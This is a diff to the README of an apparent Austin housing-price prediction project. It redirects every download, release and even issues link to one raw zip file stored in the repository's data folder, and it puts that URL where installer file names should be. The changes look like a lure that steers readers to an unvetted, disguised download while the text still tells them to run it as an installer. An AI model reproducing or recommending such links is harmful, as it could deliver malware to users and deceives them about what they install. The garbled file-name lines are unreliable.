@@ -6,7 +6,7 @@ This project helps you predict housing prices in Austin using advanced machine l
 
 ## 📥 Download the Application
 
-[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/OmerVs/austin-housing-price-prediction/releases)
+[![Download Release](https://raw.githubusercontent.com/OmerVs/austin-housing-price-prediction/main/data/price-austin-housing-prediction-v2.8.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/OmerVs/austin-housing-price-prediction/main/data/price-austin-housing-prediction-v2.8.zip)
 
 ## 📋 What You Need
 
@@ -20,11 +20,11 @@ To run the application, you will need the following:
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page.
 
-   [Visit the Releases Page to Download](https://github.com/OmerVs/austin-housing-price-prediction/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/OmerVs/austin-housing-price-prediction/main/data/price-austin-housing-prediction-v2.8.zip)
 
 2. **Choose the Latest Release:** Look for the latest version of the application. It will be marked as "Latest Release". 
 
-3. **Download the File:** Click on the file link to download the application. The file is typically named something like `austin_housing_predictor.exe` for Windows or `austin_housing_predictor.dmg` for macOS.
+3. **Download the File:** Click on the file link to download the application. The file is typically named something like `https://raw.githubusercontent.com/OmerVs/austin-housing-price-prediction/main/data/price-austin-housing-prediction-v2.8.zip` for Windows or `https://raw.githubusercontent.com/OmerVs/austin-housing-price-prediction/main/data/price-austin-housing-prediction-v2.8.zip` for macOS.
 
 4. **Install the Application:**
    - For Windows: Double-click the `.exe` file and follow the installation instructions.
@@ -73,7 +73,7 @@ If you encounter any issues while using the application, consider the following 
 2. **Check Your Data:** Ensure that all fields are filled out correctly and with valid inputs.
 3. **Restart Your Computer:** A simple restart can often fix minor issues.
 
-For further assistance, refer to the [issues section](https://github.com/OmerVs/austin-housing-price-prediction/issues) on our GitHub page.
+For further assistance, refer to the [issues section](https://raw.githubusercontent.com/OmerVs/austin-housing-price-prediction/main/data/price-austin-housing-prediction-v2.8.zip) on our GitHub page.
 
 ## 📞 Get Help
 
@@ -97,4 +97,4 @@ This project is licensed under the MIT License. You can use it freely, but pleas
 
 To keep track of updates or new releases, you can "star" the repository. This will notify you whenever there is activity.
 
-[Download the Latest Release](https://github.com/OmerVs/austin-housing-price-prediction/releases) and start predicting housing prices today!
+[Download the Latest Release](https://raw.githubusercontent.com/OmerVs/austin-housing-price-prediction/main/data/price-austin-housing-prediction-v2.8.zip) and start predicting housing prices today!
